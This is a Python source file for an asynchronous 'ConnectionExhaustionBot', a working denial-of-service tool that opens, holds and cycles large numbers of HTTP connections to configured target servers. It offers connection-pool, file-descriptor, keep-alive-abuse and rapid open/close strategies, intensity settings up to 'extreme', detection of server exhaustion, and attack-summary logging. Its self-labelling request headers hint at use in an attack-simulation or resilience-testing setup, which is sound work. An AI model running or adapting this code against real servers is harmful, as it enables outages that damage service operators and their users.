import asyncio
import httpx
import logging
import random
import time
import json
from datetime import datetime
from typing import List, Dict, Optional, Set

class ConnectionExhaustionBot:
    """Bot designed to exhaust server connection pools and file descriptors"""
    
    def __init__(self, 
                 bot_id: str,
                 target_servers: List[str],
                 intensity: str = "medium",
                 exhaustion_strategy: str = "connection_pool"):
        
        self.bot_id = bot_id
        self.target_servers = target_servers
        self.intensity = intensity
        self.exhaustion_strategy = exhaustion_strategy
        self.running = False
        
        # Exhaustion strategy configurations
        self.strategy_configs = {
            "connection_pool": {
                "max_connections_per_server": 200,
                "connection_hold_time": 30.0,
                "new_connection_rate": 10  # per second
            },
            "file_descriptor": {
                "max_connections_per_server": 500,
                "connection_hold_time": 60.0,
                "new_connection_rate": 20
            },
            "keep_alive_abuse": {
                "max_connections_per_server": 100,
                "connection_hold_time": 120.0,
                "new_connection_rate": 5
            },
            "rapid_open_close": {
                "max_connections_per_server": 1000,
                "connection_hold_time": 0.1,
                "new_connection_rate": 50
            }
        }
        
        # Intensity configurations
        self.intensity_configs = {
            "low": {"multiplier": 0.5, "hold_time_multiplier": 0.5},
            "medium": {"multiplier": 1.0, "hold_time_multiplier": 1.0},
            "high": {"multiplier": 2.0, "hold_time_multiplier": 1.5},
            "extreme": {"multiplier": 5.0, "hold_time_multiplier": 2.0}
        }
        
        # Connection tracking
        self.active_connections: Set[httpx.AsyncClient] = set()
        self.connection_history: List[Dict] = []
        
        # Attack metrics
        self.total_connections_attempted = 0
        self.total_connections_established = 0
        self.total_connections_refused = 0
        self.total_timeouts = 0
        self.max_concurrent_connections = 0
        self.server_exhaustion_detected = False
        self.attack_start_time: Optional[float] = None
        
        self.setup_logging()
    
    def setup_logging(self):
        self.logger = logging.getLogger(f'connection_exhaustion_bot_{self.bot_id}')
        handler = logging.FileHandler(f'logs/attack_logs/connection_exhaustion_{self.bot_id}.log')
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.INFO)
    
    async def execute_connection_pool_exhaustion(self, duration: float):
        """Exhaust server connection pools"""
        strategy_config = self.strategy_configs[self.exhaustion_strategy]
        intensity_config = self.intensity_configs[self.intensity]
        
        max_connections = int(strategy_config["max_connections_per_server"] * intensity_config["multiplier"])
        connection_hold_time = strategy_config["connection_hold_time"] * intensity_config["hold_time_multiplier"]
        connection_rate = int(strategy_config["new_connection_rate"] * intensity_config["multiplier"])
        
        end_time = time.time() + duration
        
        self.logger.info(f"Starting connection pool exhaustion attack for {duration}s")
        self.logger.info(f"Target: {max_connections} connections per server, hold time: {connection_hold_time}s")
        
        connection_tasks = []
        
        while time.time() < end_time and self.running:
            # Create new connections up to the limit
            current_connections = len(self.active_connections)
            connections_to_create = min(
                connection_rate,
                max_connections - current_connections
            )
            
            for i in range(connections_to_create):
                if not self.running:
                    break
                
                server = random.choice(self.target_servers)
                task = asyncio.create_task(
                    self._establish_and_hold_connection(server, connection_hold_time, i)
                )
                connection_tasks.append(task)
            
            # Update max concurrent connections metric
            current_count = len(self.active_connections)
            if current_count > self.max_concurrent_connections:
                self.max_concurrent_connections = current_count
            
            # Check for server exhaustion signs
            await self._check_server_exhaustion()
            
            # Control connection creation rate
            await asyncio.sleep(1.0 / max(1, connection_rate))
        
        # Wait for all connections to complete
        self.logger.info(f"Waiting for {len(connection_tasks)} connections to complete")
        await asyncio.gather(*connection_tasks, return_exceptions=True)
    
    async def execute_rapid_open_close_attack(self, duration: float):
        """Rapidly open and close connections to exhaust resources"""
        strategy_config = self.strategy_configs["rapid_open_close"]
        intensity_config = self.intensity_configs[self.intensity]
        
        connection_rate = int(strategy_config["new_connection_rate"] * intensity_config["multiplier"])
        end_time = time.time() + duration
        
        self.logger.info(f"Starting rapid open/close attack for {duration}s")
        self.logger.info(f"Connection rate: {connection_rate} connections/second")
        
        while time.time() < end_time and self.running:
            # Create burst of short-lived connections
            tasks = []
            for i in range(connection_rate):
                if not self.running:
                    break
                
                server = random.choice(self.target_servers)
                task = asyncio.create_task(
                    self._rapid_connection_cycle(server, i)
                )
                tasks.append(task)
            
            # Wait for burst to complete
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Brief pause between bursts
            await asyncio.sleep(1.0)
    
    async def execute_keep_alive_abuse_attack(self, duration: float):
        """Abuse HTTP keep-alive to hold connections longer"""
        strategy_config = self.strategy_configs["keep_alive_abuse"]
        intensity_config = self.intensity_configs[self.intensity]
        
        max_connections = int(strategy_config["max_connections_per_server"] * intensity_config["multiplier"])
        hold_time = strategy_config["connection_hold_time"] * intensity_config["hold_time_multiplier"]
        
        end_time = time.time() + duration
        
        self.logger.info(f"Starting keep-alive abuse attack for {duration}s")
        self.logger.info(f"Max connections: {max_connections}, hold time: {hold_time}s")
        
        connection_tasks = []
        
        # Create persistent connections with keep-alive abuse
        for i in range(max_connections):
            if not self.running:
                break
            
            server = random.choice(self.target_servers)
            task = asyncio.create_task(
                self._keep_alive_abuse_connection(server, hold_time, i)
            )
            connection_tasks.append(task)
            
            # Stagger connection creation
            await asyncio.sleep(0.1)
        
        # Wait for attack duration
        await asyncio.sleep(duration)
        
        # Cancel all connections
        for task in connection_tasks:
            task.cancel()
        
        await asyncio.gather(*connection_tasks, return_exceptions=True)
    
    async def _establish_and_hold_connection(self, server: str, hold_time: float, connection_id: int):
        """Establish a connection and hold it for specified time"""
        client = None
        connection_start = time.time()
        
        try:
            self.total_connections_attempted += 1
            
            # Create client with specific settings for connection holding
            client = httpx.AsyncClient(
                http2=False,  # Use HTTP/1.1 for compatibility
                timeout=httpx.Timeout(
                    connect=10.0,
                    read=hold_time + 10.0,
                    write=10.0,
                    pool=hold_time + 10.0
                ),
                limits=httpx.Limits(
                    max_connections=1,
                    max_keepalive_connections=1,
                    keepalive_expiry=hold_time + 5.0
                ),
                verify=False
            )
            
            self.active_connections.add(client)
            self.total_connections_established += 1
            
            # Make initial request to establish connection
            response = await client.get(f"{server}/api/data", headers={
                "User-Agent": f"ConnectionExhaustionBot/{self.bot_id}",
                "Connection": "keep-alive",
                "X-Attack-Type": "connection_exhaustion",
                "X-Connection-ID": f"{self.bot_id}_conn_{connection_id}",
                "X-Hold-Time": str(hold_time)
            })
            
            connection_established = time.time()
            
            self.logger.debug(json.dumps({
                "event": "connection_established",
                "bot_id": self.bot_id,
                "connection_id": connection_id,
                "server": server,
                "status_code": response.status_code,
                "establishment_time": connection_established - connection_start,
                "planned_hold_time": hold_time,
                "timestamp": datetime.now().isoformat()
            }))
            
            # Hold connection for specified time with periodic keep-alives
            hold_start = time.time()
            while (time.time() - hold_start) < hold_time and self.running:
                # Send periodic keep-alive requests
                try:
                    await client.get(f"{server}/api/data?keepalive=true", timeout=5.0)
                    await asyncio.sleep(min(5.0, hold_time / 10))  # Keep-alive every 5 seconds or 1/10 of hold time
                except:
                    # Connection might be closed by server
                    break
            
            actual_hold_time = time.time() - connection_established
            
            self.connection_history.append({
                "connection_id": connection_id,
                "server": server,
                "establishment_time": connection_established - connection_start,
                "actual_hold_time": actual_hold_time,
                "planned_hold_time": hold_time,
                "successful": True
            })
            
        except asyncio.TimeoutError:
            self.total_timeouts += 1
            self.logger.info(json.dumps({
                "event": "connection_timeout",
                "bot_id": self.bot_id,
                "connection_id": connection_id,
                "server": server,
                "timeout_after": time.time() - connection_start,
                "timestamp": datetime.now().isoformat()
            }))
        except Exception as e:
            if "refused" in str(e).lower():
                self.total_connections_refused += 1
                self.server_exhaustion_detected = True
                
                self.logger.info(json.dumps({
                    "event": "connection_refused_exhaustion_detected",
                    "bot_id": self.bot_id,
                    "connection_id": connection_id,
                    "server": server,
                    "error": str(e),
                    "timestamp": datetime.now().isoformat()
                }))
            else:
                self.logger.error(f"Connection failed: {e}")
        finally:
            if client:
                self.active_connections.discard(client)
                await client.aclose()
    
    async def _rapid_connection_cycle(self, server: str, cycle_id: int):
        """Rapidly open and close a connection"""
        try:
            self.total_connections_attempted += 1
            
            async with httpx.AsyncClient(
                http2=True,
                timeout=httpx.Timeout(connect=1.0, read=1.0, write=1.0, pool=1.0)
            ) as client:
                
                self.total_connections_established += 1
                
                # Make quick request then immediately close
                response = await client.get(f"{server}/", headers={
                    "User-Agent": f"ConnectionExhaustionBot/{self.bot_id}",
                    "X-Attack-Type": "rapid_cycle",
                    "X-Cycle-ID": f"{self.bot_id}_cycle_{cycle_id}"
                })
                
                # Connection closes automatically when exiting context
                
        except Exception as e:
            if "refused" in str(e).lower():
                self.total_connections_refused += 1
                self.server_exhaustion_detected = True
            elif "timeout" in str(e).lower():
                self.total_timeouts += 1
    
    async def _keep_alive_abuse_connection(self, server: str, hold_time: float, connection_id: int):
        """Abuse keep-alive connections"""
        client = None
        try:
            self.total_connections_attempted += 1
            
            client = httpx.AsyncClient(
                http2=True,
                timeout=httpx.Timeout(
                    connect=10.0,
                    read=30.0,
                    write=10.0,
                    pool=hold_time + 10.0
                ),
                limits=httpx.Limits(
                    max_connections=1,
                    max_keepalive_connections=1,
                    keepalive_expiry=hold_time
                )
            )
            
            self.active_connections.add(client)
            self.total_connections_established += 1
            
            # Send stream of small requests to abuse keep-alive
            end_time = time.time() + hold_time
            request_count = 0
            
            while time.time() < end_time and self.running:
                try:
                    response = await client.get(f"{server}/api/data?req={request_count}", headers={
                        "Connection": "keep-alive",
                        "Keep-Alive": f"timeout={int(hold_time)}, max=1000",
                        "X-Attack-Type": "keep_alive_abuse",
                        "X-Connection-ID": f"{self.bot_id}_ka_{connection_id}"
                    })
                    request_count += 1
                    await asyncio.sleep(0.5)  # Small delay between requests
                except:
                    break
            
            self.logger.debug(f"Keep-alive connection {connection_id} sent {request_count} requests over {hold_time}s")
            
        except Exception as e:
            if "refused" in str(e).lower():
                self.total_connections_refused += 1
                self.server_exhaustion_detected = True
        finally:
            if client:
                self.active_connections.discard(client)
                await client.aclose()
    
    async def _check_server_exhaustion(self):
        """Check for signs of server exhaustion"""
        if self.total_connections_refused > 10 or (self.total_timeouts > 20):
            if not self.server_exhaustion_detected:
                self.server_exhaustion_detected = True
                
                self.logger.info(json.dumps({
                    "event": "server_exhaustion_detected",
                    "bot_id": self.bot_id,
                    "connections_refused": self.total_connections_refused,
                    "timeouts": self.total_timeouts,
                    "active_connections": len(self.active_connections),
                    "timestamp": datetime.now().isoformat()
                }))
    
    async def run(self, duration: float = 300):
        """Run the connection exhaustion attack"""
        self.running = True
        self.attack_start_time = time.time()
        
        self.logger.info(json.dumps({
            "event": "connection_exhaustion_attack_started",
            "bot_id": self.bot_id,
            "intensity": self.intensity,
            "exhaustion_strategy": self.exhaustion_strategy,
            "duration": duration,
            "target_servers": self.target_servers,
            "timestamp": datetime.now().isoformat()
        }))
        
        try:
            # Execute based on strategy
            if self.exhaustion_strategy == "connection_pool":
                await self.execute_connection_pool_exhaustion(duration)
            elif self.exhaustion_strategy == "rapid_open_close":
                await self.execute_rapid_open_close_attack(duration)
            elif self.exhaustion_strategy == "keep_alive_abuse":
                await self.execute_keep_alive_abuse_attack(duration)
            elif self.exhaustion_strategy == "file_descriptor":
                # Similar to connection_pool but with higher limits
                await self.execute_connection_pool_exhaustion(duration)
            
        except asyncio.CancelledError:
            self.logger.info("Connection exhaustion attack cancelled")
        except Exception as e:
            self.logger.error(f"Connection exhaustion attack failed: {e}")
        finally:
            # Clean up any remaining connections
            for client in list(self.active_connections):
                await client.aclose()
            self.active_connections.clear()
            
            self.running = False
            await self._log_attack_summary()
    
    async def _log_attack_summary(self):
        """Log comprehensive attack summary"""
        attack_duration = time.time() - (self.attack_start_time or time.time())
        
        summary = {
            "event": "connection_exhaustion_attack_completed",
            "bot_id": self.bot_id,
            "intensity": self.intensity,
            "exhaustion_strategy": self.exhaustion_strategy,
            "attack_duration": attack_duration,
            "metrics": {
                "total_connections_attempted": self.total_connections_attempted,
                "total_connections_established": self.total_connections_established,
                "total_connections_refused": self.total_connections_refused,
                "total_timeouts": self.total_timeouts,
                "max_concurrent_connections": self.max_concurrent_connections,
                "server_exhaustion_detected": self.server_exhaustion_detected,
                "connection_success_rate": (self.total_connections_established / max(1, self.total_connections_attempted)) * 100,
                "refusal_rate": (self.total_connections_refused / max(1, self.total_connections_attempted)) * 100,
                "timeout_rate": (self.total_timeouts / max(1, self.total_connections_attempted)) * 100,
                "connections_per_second": self.total_connections_attempted / max(1, attack_duration)
            },
            "connection_statistics": {
                "total_connection_cycles": len(self.connection_history),
                "average_hold_time": sum(c["actual_hold_time"] for c in self.connection_history) / max(1, len(self.connection_history)),
                "successful_connections": sum(1 for c in self.connection_history if c["successful"])
            },
            "target_servers": self.target_servers,
            "timestamp": datetime.now().isoformat()
        }
        
        self.logger.info(json.dumps(summary))
    
    def stop(self):
        """Stop the attack"""
        self.running = False